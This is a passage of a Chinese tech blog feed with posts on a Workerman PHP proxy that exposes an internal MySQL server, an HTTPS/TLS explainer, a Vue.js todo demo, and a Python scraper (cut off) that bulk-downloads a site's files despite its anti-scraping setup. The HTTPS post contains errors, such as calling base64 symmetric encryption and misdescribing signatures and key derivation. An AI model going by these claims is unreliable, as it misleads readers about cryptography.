        <content type="html"><![CDATA[<p>wokerman作为mysql代理<br><a id="more"></a></p><p>我们知道WorkerMan是一款纯PHP开发的开源的高性能的PHP socket服务器框架，基于WorkerMan开发者可以开发出各种网络服务器，例如基于websocket的服务器、游戏服务器、移动通讯服务器、智能家居服务端、物联网服务、web服务器、RPC服务器等等。几乎任何基于TCP/UDP通讯的服务端都可以用WorkerMan来开发。WorkerMan使得开发者摆脱PHP只能用于Web开发的束缚，向更广阔的前景发展。<br><!--more--><br>今天的文章就是关于workerman可以作为客户端接收处理来自远程服务端的数据么？</p><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>外网要访问到内网的mysql服务器，需要有一台外网能访问到且能访问内网的服务器，而在这台服务器中，我们使用wokerman对数据进行转发。如下图所示：<br><img src="wokerman代理.png" alt=""></p><p>演示代码如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use Workerman\Connection\AsyncTcpConnection;</span><br><span class="line">use Workerman\Worker;</span><br><span class="line"></span><br><span class="line">require <span class="string">'workerman/Autoloader.php'</span>;</span><br><span class="line"></span><br><span class="line">// 创建一个Worker监听9090端口，不使用任何应用层协议</span><br><span class="line"><span class="variable">$tcp_worker</span> = new Worker(<span class="string">"tcp://10.211.55.13:9090"</span>);</span><br><span class="line"></span><br><span class="line">// 启动4个进程对外提供服务</span><br><span class="line"><span class="variable">$tcp_worker</span>-&gt;count = 4;</span><br><span class="line"></span><br><span class="line">//当连接建立时触发的回调函数</span><br><span class="line"><span class="variable">$tcp_worker</span>-&gt;onConnect = <span class="keyword">function</span>(<span class="variable">$connection</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"new connection from ip "</span> . <span class="variable">$connection</span>-&gt;getRemoteIp() . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">    // 异步建立一个到实际mysql服务器的连接</span><br><span class="line">    <span class="variable">$connection_to_mysql</span> = new AsyncTcpConnection(<span class="string">'tcp://127.0.1:3306'</span>);</span><br><span class="line">    // 执行异步连接</span><br><span class="line">    <span class="variable">$connection_to_mysql</span>-&gt;connect();</span><br><span class="line"></span><br><span class="line">    // mysql连接发来数据时，转发给对应客户端的连接</span><br><span class="line">    <span class="variable">$connection_to_mysql</span>-&gt;onMessage = <span class="keyword">function</span>(<span class="variable">$connection_to_mysql</span>, <span class="variable">$buffer</span>)use(<span class="variable">$connection</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$connection</span>-&gt;send(<span class="variable">$buffer</span>); //发送mysql数据</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 客户端发来数据时，转发给对应的mysql连接</span><br><span class="line">    <span class="variable">$connection</span>-&gt;onMessage = <span class="keyword">function</span>(<span class="variable">$connection</span>, <span class="variable">$buffer</span>)use(<span class="variable">$connection_to_mysql</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$connection_to_mysql</span>-&gt;send(<span class="variable">$buffer</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 当客户端发来数据时</span><br><span class="line"><span class="variable">$tcp_worker</span>-&gt;onMessage = <span class="keyword">function</span>(<span class="variable">$connection</span>, <span class="variable">$data</span>)</span><br><span class="line">&#123;</span><br><span class="line">    // 向客户端发送hello <span class="variable">$data</span></span><br><span class="line">    <span class="variable">$connection</span>-&gt;send(<span class="string">'hello '</span> . <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$connection</span>-&gt;close();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 运行worker</span><br><span class="line">Worker::runAll();</span><br></pre></td></tr></table></figure><p>参考mysql代理的手册:<a href="http://doc3.workerman.net/worker-development/connect.html" target="_blank" rel="noopener">http://doc3.workerman.net/worker-development/connect.html</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>http图解系列2</title>
      <link href="/2017/12/01/http%E5%9B%BE%E8%A7%A3%E7%B3%BB%E5%88%972/"/>
      <url>/2017/12/01/http%E5%9B%BE%E8%A7%A3%E7%B3%BB%E5%88%972/</url>
      
        <content type="html"><![CDATA[<p>看了《图解http》中的https协议，对https做一个总结，主要分为HTTPS的实质、HTTPS加密原理、HTTPS的通信过程等几个部分<br><a id="more"></a></p><h2 id="https是什么，为什么会出现？"><a href="#https是什么，为什么会出现？" class="headerlink" title="https是什么，为什么会出现？"></a>https是什么，为什么会出现？</h2><h3 id="http存在的问题"><a href="#http存在的问题" class="headerlink" title="http存在的问题"></a>http存在的问题</h3><p>http协议简单，这个优点也是其缺点，由于HTTP协议过于简单：                   </p><ul><li>通信使用明文（不加密），内容可能会被窃听。</li><li>不验证通信方的身份，因此可能遭遇伪装</li><li>无法验证报文的完整性，所以有可能已遭篡改。<br>为了解决诸多问题，HTTPS应运而生。</li></ul><h3 id="https的实质"><a href="#https的实质" class="headerlink" title="https的实质"></a>https的实质</h3><p>HTTP加上加密处理、认证机制、以及完整性保护后的就是HTTPS。<br>需要知道的是，HTTPS并非是应用层的一种新的协议。只是HTTP通信接口部分用SSL或TLS协议代替而已。也就是说，所谓的HTTPS，其实就是身披SSL协议外壳的HTTP。</p><h3 id="SSL-amp-TLS"><a href="#SSL-amp-TLS" class="headerlink" title="SSL&amp;TLS"></a>SSL&amp;TLS</h3><p>HTTPS中使用了SSL和TLS这两个协议。<br>TLS以SSL3.0为基准，后又制定了TLS1.0、TLS1.1和TLS1.2。当前主流的版本是SSL3.0和TLS1.0。<br>TLS是以SSL为原型开发的协议，有时候会统称该协议为SSL。</p><h2 id="hTTPS的加密原理"><a href="#hTTPS的加密原理" class="headerlink" title="hTTPS的加密原理"></a>hTTPS的加密原理</h2><p>近代的加密算法中加密算法是公开的，而密钥是保密的。通过这种方式来保持加密方法的安全性。<br>加密和解密要用到密钥，如果没有密钥就没有办法对密码解密。换句话来说，任何人只要持有密钥就能够对密文进行解密。<br>HTTPS在加密过程中使用了非对称加密技术和对称加密技术。</p><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><blockquote><p>采用单钥密码系统的加密方式，同一个密钥可以同时做信息的加密和解密，这种加密的方法称为对称加密，也称为单密钥加密。像我们常见的base64加密就是赌城加密</p></blockquote><p>下面会把对称加密算法称为共享密钥加密算法。</p><p>假如现在，SSL在通信过程中，使用了对称加密算法，也就是说客户端和服务器同时共享一个密钥。<br>于是，以共享密钥的方式加密，必须将密钥发给对方。这个时候，假如通信过程被监听，密钥被攻击者获取了，那么这个时候也就失去了加密的意义了。<br><img src="https.png" alt=""></p><p>那么，有没有办法解决这个问题呢？答案是肯定的，也就是使用两把密钥。</p><p>下面先看使用两把密钥的非对称加密算法。</p><h3 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h3><blockquote><p>与对称加密算法相反，非对称加密算法需要两个密钥来进行加密和解密，这两个密钥是配对的，分别是公开密钥（公钥）和私有密钥（私钥）。</p></blockquote><p>一般情况下，公钥是可以被公开的，它主要用来加密明文。而相应的，私钥不能被公开，用来解密公钥加密的密文。</p><p>值得注意的是：公钥加密后的密文只能通过对应的私钥来解密，而私钥加密的密文却可以通过对应的公钥来解密。</p><p>以上，公钥加密私钥解密用来加密，私钥加密公钥解密用来签名。相关用途后面会讲到。</p><p>下面会把非对称加密算法称为公开密钥加密算法。</p><p>假设现在由服务器来生成一对公钥和私钥。当客户端第一次发请求和服务器协商的时候，服务器就生成了一对公钥和私钥。</p><p>紧接着，服务器把公钥发给客户端（明文，不需要做任何加密），客户端接收后，随机生成一个密钥，使用服务器发过来的公钥进行加密。</p><p>再接着，客户端把使用公钥加密的密钥发给服务器，服务器接收到了以后，用配对的私钥进行解密，就得到了客户端随机生成的那个密钥。</p><p>这个时候，客户端和服务端所持的密钥都是相同的。此时，交换密钥环节就完成了。</p><p>于是通信开始时就可进行上面所述的共享密钥加密方式来进行加密。</p><h3 id="为什么同时使用对称与非对称加密方式"><a href="#为什么同时使用对称与非对称加密方式" class="headerlink" title="为什么同时使用对称与非对称加密方式"></a>为什么同时使用对称与非对称加密方式</h3><p>可能，有小伙伴就会问，为什么要大费周章使用非对称加密的方式，然后再得到相同的密钥，进行共享密钥加密的通信呢？</p><p>由于公开密钥加密处理起来比共享密钥加密方式更为复杂，因此在通信的时候使用公开密钥加密的方式，效率很低。</p><p>于是，我们需要使用非对称加密的方式来保证密钥共享的过程中密钥的安全性，而后在通信的过程中使用对称加密算法，这是最合理的设计方式，在保证安全性的同时又保证了性能。</p><p>所以，HTTPS采用共享密钥加密和公开密钥加密两者并用的混合加密机制。在交换密钥使用环节使用公开密钥加密方式，之后建立的通信交换报文阶段则使用共享密钥加密方式。</p><p>以上，大概就是使用对称加密和非对称加密的过程。看似过程很完美，其实还存在着一个问题，就是：如何保证服务器传过来的公开密钥的正确性。换句话说，就是保证它不被拦截篡改。</p><h2 id="怎么保证公钥的正确性"><a href="#怎么保证公钥的正确性" class="headerlink" title="怎么保证公钥的正确性"></a>怎么保证公钥的正确性</h2><p>假如现在正准备和某台服务器建立公开密钥加密方式下的通信，如何证明客户端收到的公开密钥就是原本预想的那台服务器发行的公开密钥呢？或许，在公开密钥传输的过程中，真正的公开密钥可能已经被攻击者替换掉了。</p><p>为了解决这个问题，可以使用由数字证书机构和其相关颁发的公开密钥证书。<br>下面阐述一下数字证书认证机构（简称CA）的业务流程：</p><p>首先，服务器的运营人员向数字证书机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。<br>我们用白话文来翻译一下上面这段话：</p><p>首先，CA会向申请者颁发一个证书，这个证书里面的内容有：签发者、证书用途、服务器申请的时候附带的公钥、服务器的加密算法、使用的HASH算法、证书到期的时间等等。<br>紧接着，把上面所提到的内容，做一次HASH求值，得到一个HASH值。<br>再接着，用CA的私钥进行加密，这样就完成了数字签名。而用CA的私钥加密后，就生成了类似人体指纹的签名，任何篡改证书的尝试，都会被数字签名发现。<br>最后，把数字签名，附在数字证书的末尾，传输给服务器。<br>接下来，服务器会把这份由数字证书认证机构颁发的公钥证书发给客户端。这个时候，客户端可以使用数字证书机构的公开密钥对其进行验证。一旦验证成功，客户端便能够确定这个公开密钥是可信的。<br>我们再用白话文来翻译一下：</p><p>客户端拿到这个数字证书以后，用CA私钥对应的公钥，可以解密数字证书末尾的数字签名，得到证书的内容以及原始的HASH值。<br>紧接着，客户端按照证书中的HASH算法，对证书的内容求HASH值。如果通过CA公钥解密的HASH和通过计算求得的HASH值相同，那么认证通过，否则失败。<br>如果认证通过，就可以取得服务器的公开密钥。<br>那客户端上面的CA公钥是从哪里来的呢？</p><p>多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。这样，就方便客户端对于数字证书真实性的验证。</p><p>其具体过程是这样子的（图中简化了数字签名的过程）：</p><p><img src="caf.png" alt=""></p><p>这里其实就用到了非对称加密算法，只不过现在这个加密算法用来签名而不是加密。</p><p>使用私钥加密，公钥解密，用于公钥的持有者验证通过私钥加密的内容是否被篡改，但是不用来保证内容是否被他人获得。</p><p>而使用公钥加密，私钥解密，则是相反的，它不保证信息被他人截获篡改，但是保证信息无法被中间人获得。</p><p>客户端证书<br>HTTPS中不仅可以使用服务器证书，还可以使用客户端证书。以客户端证书进行客户端认证，它的作用与服务器证书是相同的。</p><p>由于客户端获取证书需要用户自行安装客户端证书，同时也面临着费用的问题。</p><p>因此，现状是，安全性极高的认证机构可办法客户端证书但是仅用于特殊用途的业务。比如那些可支撑客户端证书支出费用的业务。</p><p>例如，银行的网上银行就采用了客户端证书。在登录网银时不仅要求用户确认输入ID和密码，还会要求用户的客户端证书，以确认用户是否从特定的终端访问网银。</p><h2 id="HTTPS通信全过程"><a href="#HTTPS通信全过程" class="headerlink" title="HTTPS通信全过程"></a>HTTPS通信全过程</h2><p><img src="通信全过程.png" alt=""></p><p>现在我们来理清一下SSL建立的过程：</p><p>客户端通过发送Client Hello报文开始SSL通信。报文中包含客户端支持的SSL的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。<br>注意：客户端还会附加一个随机数，这里记为A。</p><p>服务器可进行SSL通信时，会以Server Hello报文作为应答。和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。<br>注意：这里服务器同样会附加一个随机数，发给客户端，这里记为B。</p><p>之后服务器发送Certificate报文。报文中包含公开密钥证书。（具体的数字签名请看证书一节）</p><p>最后服务器发送Server Hello Done报文通知客户端，最初阶段的SSL握手协商部分结束。</p><p>SSL第一次握手结束后，客户端会对服务器发过来的证书进行验证，如果验证成功，解密取出证书中的公钥。（具体查看证书一节）<br>接着，客户端以Client Key Exchange报文作为回应。报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串。该报文使用从证书中解密获得的公钥进行加密（其实就是服务器的公钥）。 </p><p>客户端继续发送Change Cipher Spec报文。用于告知服务端，客户端已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了。</p><p>客户端发送Finished报文。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p><p>服务器接收到客户端的请求之后，使用私钥解密报文，把Pre-master secret取出来。接着，服务器同样发送Change Cipher Spec报文。</p><p>服务器同样发送Finished报文。</p><p>服务器和客户端的Finished报文交换完毕之后，SSL连接就算建立完成。当然，通信会受到SSL的保护。从此处开始进行应用层协议的通信，即发送HTTP请求。</p><p>应用层协议通信，即发送HTTP响应。</p><p>最后由客户端断开连接。断开连接时，发送close_notify报文。上图做了一些省略，这步之后再发送TCP FIN报文来关闭与TCP的通信。<br>那现在有一个问题，整个过程中产生的三个随机数有什么用呢？还有，后面进行HTTP通信的时候，是用哪一个密钥进行加密，还有怎么保证报文的完整性。</p><p><img src="随机数.png" alt=""><br>对于客户端：<br>当其生成了Pre-master secret之后，会结合原来的A、B随机数，用DH算法计算出一个master secret，紧接着根据这个master secret推导出hash secret和session secret。</p><p>对于服务端：<br>当其解密获得了Pre-master secret之后，会结合原来的A、B随机数，用DH算法计算出一个master secret，紧接着根据这个master secret推导出hash secret和session secret。</p><p>在客户端和服务端的master secret是依据三个随机数推导出来的，它是不会在网络上传输的，只有双方知道，不会有第三者知道。同时，客户端推导出来的session secret和hash secret与服务端也是完全一样的。<br>那么现在双方如果开始使用对称算法加密来进行通讯，使用哪个作为共享的密钥呢？过程是这样子的：</p><p>双方使用对称加密算法进行加密，用hash secret对HTTP报文做一次运算生成一个MAC，附在HTTP报文的后面，然后用session-secret加密所有数据（HTTP+MAC），然后发送。</p><p>接收方则先用session-secret解密数据，然后得到HTTP+MAC，再用相同的算法计算出自己的MAC，如果两个MAC相等，证明数据没有被篡改。</p><p>MAC(Message Authentication Code)称为报文摘要，能够查知报文是否遭到篡改，从而保护报文的完整性。<br>至此，整个过程介绍完毕。</p><h2 id="使用HTTPS场景"><a href="#使用HTTPS场景" class="headerlink" title="使用HTTPS场景"></a>使用HTTPS场景</h2><p>当HTTP披上SSL外壳之后，由于加入了诸多验证的机制，虽然安全性大大提高了，但是它的处理速度会变慢。慢的原因分以下两种：</p><p>服务器在与客户端协商次数增多，也就是说整体上处理通信量会不可避免的增加。<br>SSL进行加密处理，在服务端和客户端都需要进行加密和解密的运算处理。结果会消耗更多的硬件资源，导致负载增加。<br>可见，使用HTTPS会消耗更多的资源。如果每次通信都加密，那么平摊到一台计算机上，能够处理的请求数量也必定会减少。</p><p>同时，使用HTTPS需要向CA购买证书，于是开销也成为考虑是否使用HTTPS的原因之一。</p><p>所以，大部分的Web网站都采取了一个折中的方法。对于一些需要隐藏、私密的信息进行加密，而普通的信息不进行加密处理，以节省资源。</p>]]></content>
      
      
      <categories>
          
          <category> http </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用vuejs写一个简单的todolist</title>
      <link href="/2017/11/21/%E4%BD%BF%E7%94%A8vuejs%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84todolist/"/>
      <url>/2017/11/21/%E4%BD%BF%E7%94%A8vuejs%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84todolist/</url>
      
        <content type="html"><![CDATA[<p>以下是学习vue的一点demo,涉及到数据双向绑定v-model，事件触发预处理v:<br><a id="more"></a></p><p><img src="task.gif" alt=""></p><p>代码如下：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;    &lt;style&gt;        .completed{            color: green;            text-decoration: line-through;        }    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;nav class=&quot;navbar navbar-default&quot;&gt;    &lt;div class=&quot;container-fluid&quot;&gt;        &lt;div class=&quot;navbar-header&quot;&gt;            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;                Todo list            &lt;/a&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/nav&gt;&lt;div class=&quot;container&quot; id=&quot;app&quot;&gt;    &lt;div class=&quot;col-md-8 col-md-offset-2&quot;&gt;        &lt;div class=&quot;panel panel-default&quot;&gt;            &lt;div class=&quot;panel-heading&quot;&gt;WelCome to My list&lt;/div&gt;            &lt;div class=&quot;panel-body&quot;&gt;                &lt;h1&gt;My todos{{todoCount}}&lt;/h1&gt;                &lt;todo-items :todos=&quot;todos&quot;&gt;&lt;/todo-items&gt;                &lt;form-items :todos=&quot;todos&quot;&gt;&lt;/form-items&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/x-template&quot; id=&quot;todo-items-template&quot;&gt;    &lt;ul class=&quot;list-group&quot;&gt;        &lt;li class=&quot;list-group-item&quot; v-bind:class=&quot;{&apos;completed&apos;:todo.completed}&quot; v-for=&quot;(todo,index) in todos&quot;&gt;{{todo.title}}            &lt;button class=&quot;btn btn-success btn-xs pull-right&quot; v-on:click=&quot;completeTodo(todo)&quot;&gt;完成&lt;/button&gt;            &lt;button class=&quot;btn btn-warning btn-xs pull-right&quot; v-on:click=&quot;deleteTodo(index)&quot;&gt;删除&lt;/button&gt;        &lt;/li&gt;    &lt;/ul&gt;&lt;/script&gt;&lt;script type=&quot;text/x-template&quot; id=&quot;form-template&quot;&gt;    &lt;form v-on:submit.prevent=&quot;addTodo(newtodo)&quot;&gt;        &lt;div class=&quot;form-group&quot;&gt;            &lt;input type=&quot;text&quot; class=&quot;form-control&quot; v-model=&quot;newtodo.title&quot; placeholder=&quot;添加一个任务&quot;&gt;        &lt;/div&gt;        &lt;div class=&quot;form-group&quot;&gt;            &lt;button class=&quot;btn btn-success&quot; type=&quot;submit&quot;&gt;添加&lt;/button&gt;        &lt;/div&gt;    &lt;/form&gt;&lt;/script&gt;&lt;script&gt;    Vue.component(&apos;todo-items&apos;,{       template:&apos;#todo-items-template&apos;,        props:[&apos;todos&apos;],        methods:{            deleteTodo:function (index) {                console.log(index);                this.todos.splice(index,1);            },            completeTodo:function (todo) {                if (!todo.completed) {                    todo.completed = true                } else {                    alert(&apos;该任务已完成&apos;);                }            }        }    });    Vue.component(&apos;form-items&apos;,{        template:&apos;#form-template&apos;,        props:[&apos;todos&apos;],        data(){          return {              newtodo:{id:null,title:&apos;&apos;,completed:false}          }        },        methods: {            addTodo: function (newTodo) {                if (newTodo.title == &apos;&apos;) {                    alert(&apos;不能为空！&apos;)                } else {                    this.todos.push(newTodo);                    this.newtodo = {id: null, title: &apos;&apos;, completed: false}                }            }        }    });    new Vue({        el:&apos;#app&apos;,        data:{            message:&apos;Hello World&apos;,            todos:[                {id:1,title:&apos;hello world&apos;,completed:true},                {id:2,title:&apos;hello china&apos;,completed:false}            ],        },        computed:{          todoCount:function () {              return this.todos.length;          }        },    });&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> vuejs </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php知识图谱</title>
      <link href="/2017/11/16/php%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
      <url>/2017/11/16/php%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.processon.com/view/596700d6e4b043caf880b819" target="_blank" rel="noopener">php知识图谱</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>多进程爬取js加载的网站的pdf文件</title>
      <link href="/2017/11/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%88%AC%E5%8F%96js%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%BD%91%E7%AB%99%E7%9A%84pdf%E6%96%87%E4%BB%B6/"/>
      <url>/2017/11/16/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%88%AC%E5%8F%96js%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%BD%91%E7%AB%99%E7%9A%84pdf%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>最近接了一个自动化的小外包，需要将国外的某一个网站上的pdf文件全部下载下来，<a href="http://www.jameshardie.co.nz/specifiers/cad-library" target="_blank" rel="noopener">目标网站</a><br><a id="more"></a></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>所有数据是js加载，第一感觉应该使用selniume来做，但是网站首页的目录也是动态加载的，只有鼠标出发事件的时候才会加载div，这样子selniume无法来做，然后就想着抓包看一下，用charles，抓包之后，发现大大的惊喜，原来为了反爬虫，把数据都放在一个js文件，然后触发事件的时候再进行拼凑，这个措施已经可以防止很多新手爬虫爬取，可以说是一个很棒的反爬措施，但是上有政策，下有对策，我们抓完包之后，发现，网站一开始就把所有数据都进行返回。<br><img src="jsdata.png" alt=""><br>使用charles按照pdf文件名找到了数据源<br><img src="datasource.png" alt=""><br>分析完毕之后，我们就可以编码了。</p><h2 id="单进程下载"><a href="#单进程下载" class="headerlink" title="单进程下载"></a>单进程下载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__author__ = <span class="string">'seven'</span></span><br><span class="line">import requests</span><br><span class="line">import codecs</span><br><span class="line">import json</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">单进程下载</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://www.jameshardie.co.nz/specifiers/cad-library'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##将要获取的数据源写入文件当中</span></span><br><span class="line">def writedatatojson():</span><br><span class="line">    data_response = requests.get(<span class="string">'http://cdnmaster.smartb.im/staging/td/jh/scripts/databoom.js'</span>,headers = header)</span><br><span class="line">    datatable = re.search(<span class="string">'my.dt=(.)*;my'</span>,data_response.text).group(0).split(<span class="string">';my'</span>)[0]</span><br><span class="line">    datatable = json.loads(datatable[7:])</span><br><span class="line">    with codecs.open(<span class="string">'data.json'</span>, <span class="string">'w'</span>) as file:</span><br><span class="line">        file.write(json.dumps(datatable))</span><br><span class="line">        file.close()</span><br><span class="line"><span class="comment">##从文件当中获取json数据</span></span><br><span class="line">def getdatafromjson():</span><br><span class="line">    with open(<span class="string">'data.json'</span>) as json_file:</span><br><span class="line">        data = json.load(json_file)</span><br><span class="line">        <span class="built_in">return</span> data</span><br><span class="line"><span class="comment">##下载文件</span></span><br><span class="line">def download(category,file_name,pdf_url,dwg_url,gif_url):</span><br><span class="line">    <span class="comment">#新建文件夹</span></span><br><span class="line">    <span class="keyword">if</span> not os.path.exists(category):</span><br><span class="line">        os.makedirs(category)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"创建文件夹成功"</span>)</span><br><span class="line">    <span class="comment">#下载pdf</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"正在下载pdf"</span>)</span><br><span class="line">    pdf_response = requests.get(pdf_url,stream=True,headers = header)</span><br><span class="line">    with open(category+<span class="string">'/'</span>+file_name+<span class="string">'.pdf'</span>,<span class="string">'wb'</span>) as pdf_file:</span><br><span class="line">        pdf_file.write(pdf_response.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"pdf下载完成"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"正在下载dwg"</span>)</span><br><span class="line">    dwg_response = requests.get(dwg_url,stream=True,headers = header)</span><br><span class="line">    with open(category+<span class="string">'/'</span>+file_name + <span class="string">'.dwg'</span>, <span class="string">'wb'</span>) as dwg_file:</span><br><span class="line">        dwg_file.write(dwg_response.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"dwg下载完成"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"正在下载gif"</span>)</span><br><span class="line">    gif_response = requests.get(gif_url,stream=True,headers = header)</span><br><span class="line">    with open(category+<span class="string">'/'</span>+file_name + <span class="string">'.gif'</span>, <span class="string">'wb'</span>) as gif_file:</span><br><span class="line">        gif_file.write(gif_response.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"gif下载完成"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    baseurl = <span class="string">'http://cdnmaster.smartb.im/staging/td/jh/cadbim/'</span></span><br><span class="line">    current_dir = os.getcwd()</span><br><span class="line">    writedatatojson()</span><br><span class="line">    datas = getdatafromjson()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas[1:]:</span><br><span class="line">        os.chdir(os.path.join(current_dir))</span><br><span class="line">        category = data[-4]</span><br><span class="line">        file_name = str(data[-1]).replace(category+<span class="string">'/'</span>,<span class="string">''</span>)</span><br><span class="line">        down_url =str(data[-1])</span><br><span class="line">        <span class="comment">#pdf 下载链接</span></span><br><span class="line">        pdf_url = <span class="string">'%s%s.pdf'</span>%(baseurl,<span class="string">'pdf/'</span>+down_url)</span><br><span class="line">        <span class="comment">#dwg下载链接</span></span><br><span class="line">        dwg_url = <span class="string">'%s%s.dwg'</span>%(baseurl,<span class="string">'dwg/'</span>+down_url)</span><br><span class="line">        <span class="comment">#gif下载链接</span></span><br><span class="line">        gif_url = <span 